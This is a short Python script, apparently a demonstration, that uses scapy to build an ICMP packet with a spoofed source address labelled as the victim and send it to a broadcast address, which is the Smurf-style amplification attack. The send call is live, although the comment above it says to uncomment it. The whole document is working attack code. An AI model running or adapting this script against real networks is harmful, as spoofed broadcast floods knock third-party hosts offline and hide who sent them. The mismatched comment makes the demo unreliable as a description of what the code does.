from scapy.all import IP, ICMP, send
import socket

victim_ip = "192.168.1.50"
# my_ip = socket.gethostbyname(socket.gethostname())
broadcast_ip = "10.42.0.147"

print(f"Constructing packet...")
print(f"Spoofing Source IP as: {victim_ip}")
print(f"Sending to Broadcast: {broadcast_ip}")

packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

print("\nPacket Header Details:")
packet.show() 

# Uncomment the line below to send a single demonstration packet
send(packet, count=1)